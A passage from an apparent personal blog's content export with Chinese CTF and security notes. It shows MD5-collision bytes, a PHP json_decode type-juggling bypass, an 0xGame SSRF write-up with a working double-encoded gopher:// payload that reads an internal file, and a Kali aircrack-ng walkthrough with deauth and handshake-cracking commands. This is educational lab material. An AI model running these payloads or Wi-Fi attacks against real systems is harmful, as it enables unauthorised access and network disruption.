class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%<span class="hljs-number">5</span>f%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%f3%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%e9%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">13</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%a8%<span class="hljs-number">1</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%<span class="hljs-number">39</span>%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;c=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%ed%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%a7%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%e6%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">16</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%<span class="hljs-number">33</span>%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%<span class="hljs-number">6</span>f%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br></code></pre></div></td></tr></table></figure><h1 id="2-json-解码绕过"><a href="#2-json-解码绕过" class="headerlink" title="2. json 解码绕过"></a>2. json 解码绕过</h1><p>PHP 在处理传入的 json 串时使用 json_decode 将其解码，再进行比较时，我们不需要知道比较字串的内容，也可以利用字符串与 0 比较为真的特点绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>$flag = &#x27;ook!&#x27;;<br>$a = $_GET[&#x27;a&#x27;];<br>$b = json_decode($a);<br>echo $b-&gt;abc;<br>var_dump($b-&gt;abc == $flag);<br>if ($b-&gt;abc == $flag)<br>    echo $flag;<br>else<br>    echo &quot;error!!&quot;;<br>?&gt;<br></code></pre></div></td></tr></table></figure><p>当传入<code>?a=&#123;&quot;abc&quot;:0&#125;</code>时，输出</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">0<br>bool(true) <br>ook!<br></code></pre></div></td></tr></table></figure><p>注意这里的 <code>&#123;&quot;abc&quot;:0&#125;</code> ，0是数字，而加双引号 <code>&#123;&quot;abc&quot;:&quot;0&quot;&#125;</code> 之后两边都是字符，就不相等了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>hash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF_Me</title>
    <link href="/2021/10/20/SSRF_Me/"/>
    <url>/2021/10/20/SSRF_Me/</url>
    
    <content type="html"><![CDATA[<p>0xgame.h4ck.fun</p><h2 id="题目页面"><a href="#题目页面" class="headerlink" title="题目页面"></a>题目页面</h2><p><a href="http://106.15.250.209:6655/">http://106.15.250.209:6655/</a></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/127.0.0.1|flag|dict|file|ftp/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;想都别想&#x27;</span>);<br>&#125;<span class="hljs-comment">//read.php</span><br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></div></td></tr></table></figure><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>利用 ssrf 漏洞</p><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>首先观察 php 文件，发现可传入的变量 <code>$url</code> ，使用 get 方式传入</p><p>由于 if 语句对 url 进行了关键字过滤，无法直接查询 &#x2F;flag 目录，也无法使用 dict, file, ftp 协议访问文件目录，考虑使用 <strong>gopher</strong> 协议</p><p>注意到 127.0.0.1 被过滤，改为使用 localhost 访问，关于 <code>preg_match()</code> 过滤的绕过，<a href="%E4%BC%A0%E5%8F%82%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87.md">看这里</a></p><p>利用注释提示的 read.php ，首先尝试访问 <a href="http://106.15.250.209:6655/read.php">http://106.15.250.209:6655/read.php</a> ，发现无法从外部访问</p><p>使用 url 变量，构造请求尝试访问 <a href="http://106.15.250.209:6655/?url=localhost/read.php">http://106.15.250.209:6655/?url=localhost/read.php</a></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>返回结果</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>if(&#x27;127.0.0.1&#x27;!=$_SERVER[&#x27;REMOTE_ADDR&#x27;])&#123;<br>    die(&#x27;Allow local only&#x27;);<br>&#125;<br>if(&#x27;GET&#x27; === $_SERVER[&#x27;REQUEST_METHOD&#x27;])&#123;<br>  highlight_file(__FILE__);<br>  die(&#x27;Invalid request mode&#x27;);<br>&#125;<br><br>$filename=$_POST[&#x27;name&#x27;];<br>if(preg_match(&#x27;/..\//&#x27;,$filename))&#123;<br>    die(&#x27;nonono&#x27;);<br>&#125;<br>echo file_get_contents(urldecode($filename));Invalid request mode<br></code></pre></div></td></tr></table></figure><p>发现使用 url 变量直接访问的形式不对，需要使用 post 形式的请求</p><p>使用 gopher 协议构造本地访问请求的 post 报文</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">POST /read.php HTTP/1.1<br>Host: localhost:80<br>content-type: application/x-www-form-urlencoded<br>Content-Length: 14<br><br>name=flag<br><br></code></pre></div></td></tr></table></figure><p>注意使用多重 url 编码，同时对 flag 进行转码，防止在初次传入 url 时被过滤</p><table><thead><tr><th align="center">hex</th><th align="center">character</th></tr></thead><tbody><tr><td align="center">20</td><td align="center">space</td></tr><tr><td align="center">25</td><td align="center">%</td></tr><tr><td align="center">2F</td><td align="center">&#x2F;</td></tr><tr><td align="center">3A</td><td align="center">:</td></tr></tbody></table><p>最终得到的地址</p><p><a href="http://106.15.250.209:6655/?url=gopher://localhost:80/_POST%2520/read.php%2520HTTP/1.1%250D%250AHost%253A%2520localhost%253A80%250D%250Acontent-type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252014%250D%250A%250D%250Aname%253D%25252F%252566lag%250D%250A">http://106.15.250.209:6655/?url=gopher%3A%2F%2Flocalhost%3A80%2F_POST%2520%2Fread.php%2520HTTP%2F1.1%250D%250AHost%253A%2520localhost%253A80%250D%250Acontent-type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252014%250D%250A%250D%250Aname%253D%25252F%252566lag%250D%250A</a></p><p>回显</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php <br>error_reporting(0);<br>highlight_file(__FILE__);<br>$url=$_GET[&#x27;url&#x27;];<br>if(preg_match(&#x27;/127.0.0.1|flag|dict|file|ftp/i&#x27;,$url))&#123;<br>  die(&#x27;想都别想&#x27;);<br>&#125;//read.php<br>$ch = curl_init();<br>curl_setopt($ch, CURLOPT_URL, $url);<br>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);<br>curl_setopt($ch, CURLOPT_HEADER, 0);<br>$output = curl_exec($ch);<br>echo $output;<br>curl_close($ch);<br>HTTP/1.1 200 OK Server: nginx/1.16.1 Date: Thu, 21 Oct 2021 14:29:39 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive X-Powered-By: PHP/7.4.5 29 0xGame&#123;G0pher_pr0toc01_ls_v3ry_p0werfu1&#125; 0<br></code></pre></div></td></tr></table></figure><p>解决</p><h2 id="Extra"><a href="#Extra" class="headerlink" title="Extra"></a>Extra</h2><p>ssrf相关资料</p><p><a href="https://blog.csdn.net/weixin_52250313/article/details/119496835">https://blog.csdn.net/weixin_52250313/article/details/119496835</a></p><p><a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Kali的aircrack-ng</title>
    <link href="/2021/03/07/%E5%9F%BA%E4%BA%8EKali%E7%9A%84aircrack-ng/"/>
    <url>/2021/03/07/%E5%9F%BA%E4%BA%8EKali%E7%9A%84aircrack-ng/</url>
    
    <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="1-Kali-2019-4"><a href="#1-Kali-2019-4" class="headerlink" title="1. Kali 2019.4"></a>1. Kali 2019.4</h3><ul><li>aircrack-ng套件</li><li>可选的简体中文系统语言包(若WiFi名称包含中文时可能遇到的显示异常)</li></ul><h3 id="2-支持Kali以及monitor模式的无线网卡"><a href="#2-支持Kali以及monitor模式的无线网卡" class="headerlink" title="2. 支持Kali以及monitor模式的无线网卡"></a>2. 支持Kali以及monitor模式的无线网卡</h3><ul><li>此次测试使用的为TL-WN722N V1(可能不支持的V2版本)</li></ul><h3 id="3-虚拟机软件或USB启动盘"><a href="#3-虚拟机软件或USB启动盘" class="headerlink" title="3.虚拟机软件或USB启动盘"></a>3.虚拟机软件或USB启动盘</h3><ul><li>用于Kali的启动</li></ul><h2 id="抓取握手包"><a href="#抓取握手包" class="headerlink" title="抓取握手包"></a>抓取握手包</h2><p>以下过程均以root用户执行，普通用户需使用 <strong>sudo</strong> 命令</p><h3 id="1-查看网卡信息"><a href="#1-查看网卡信息" class="headerlink" title="1. 查看网卡信息"></a>1. 查看网卡信息</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">airmon-ng<br></code></pre></div></td></tr></table></figure><h3 id="2-网卡开启监听模式"><a href="#2-网卡开启监听模式" class="headerlink" title="2. 网卡开启监听模式"></a>2. 网卡开启监听模式</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">airmon-ng start wlan0<br></code></pre></div></td></tr></table></figure><h3 id="3-扫描附近WiFi"><a href="#3-扫描附近WiFi" class="headerlink" title="3. 扫描附近WiFi"></a>3. 扫描附近WiFi</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">airodump-ng wlan0mon<br></code></pre></div></td></tr></table></figure><p>会列出扫描到的附近WiFi<br>记下目标WiFi的BSSID和CH(信道)<br>按CTRL+C退出扫描</p><h3 id="4-抓取握手包"><a href="#4-抓取握手包" class="headerlink" title="4. 抓取握手包"></a>4. 抓取握手包</h3><h4 id="开始抓包"><a href="#开始抓包" class="headerlink" title="开始抓包"></a>开始抓包</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">airodump-ng wlan0mon --ivs -c [CH] --bssid [BSSID] -w ~/ wlan0mon<br><span class="hljs-comment">#wlan0    为此前开启监听模式的网卡名称</span><br><span class="hljs-comment">#--ivs    表示只存储可用于破解的握手包，存储文件类型为.ivs</span><br><span class="hljs-comment">#[CH]和[BSSID]替换为目标的CH和BSSID</span><br><span class="hljs-comment">#-w       想存放握手包的路径，上述命令会在当前用户目录下创建 wlan0mon-01.ivs ,多次运行此命令时文件名形如 wlan0mon-0x.ivs</span><br></code></pre></div></td></tr></table></figure><p>可以看到哪些设备连接到了wifi，STATION就是连接设备的MAC地址<br>当抓取到握手包时，会显示 [WPA-handshake] ，按CTRL+C退出抓包</p><h4 id="强制设备下线重连"><a href="#强制设备下线重连" class="headerlink" title="强制设备下线重连"></a>强制设备下线重连</h4><p>开始抓包后，需要等用户连接我们WiFi，才能抓到包。所以我们需要利用aireplay-ng工具，给连接到WiFii的一个设备发送deauth(反认证)包，使该设备断开WiFi，随后它自然会再次连接WiFi</p><p>新建终端</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">aireplay-ng -0 3 -a [BSSID] -c [STATION] wlan0mon<br><span class="hljs-comment">#-0 指定攻击次数，0表示无限次</span><br><span class="hljs-comment">#-a 指定攻击WiFi的BSSID</span><br><span class="hljs-comment">#-c 指定连接到攻击WiFi的设备，可在抓包界面中找到连接到WiFi的设备STATION</span><br></code></pre></div></td></tr></table></figure><h3 id="5-网卡关闭监听模式"><a href="#5-网卡关闭监听模式" class="headerlink" title="5.网卡关闭监听模式"></a>5.网卡关闭监听模式</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">airmon-ng stop wlan0mon<br></code></pre></div></td></tr></table></figure><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h4 id="Wordlists"><a href="#Wordlists" class="headerlink" title="Wordlists"></a>Wordlists</h4><p>Wordlists是Kali自带的字典文件，存放路径为&#x2F;usr&#x2F;share&#x2F;wordlists<br>此次破解仅使用rockyou.txt字典，找到rockyou.txt.gz，解压得到rockyou.txt</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">aircrack-ng -w [字典路径] [握手包路径]<br></code></pre></div></td></tr></table></figure><p>漫长等待。。。。。。</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>Hashcat</li><li>Crunch</li><li><a href="http://www.pinlue.com/article/2020/10/0122/5911272202549.html">http://www.pinlue.com/article/2020/10/0122/5911272202549.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/161020764">https://zhuanlan.zhihu.com/p/161020764</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>阿里云ECS服务器上部署下载器Aria2+AriaNg</title>
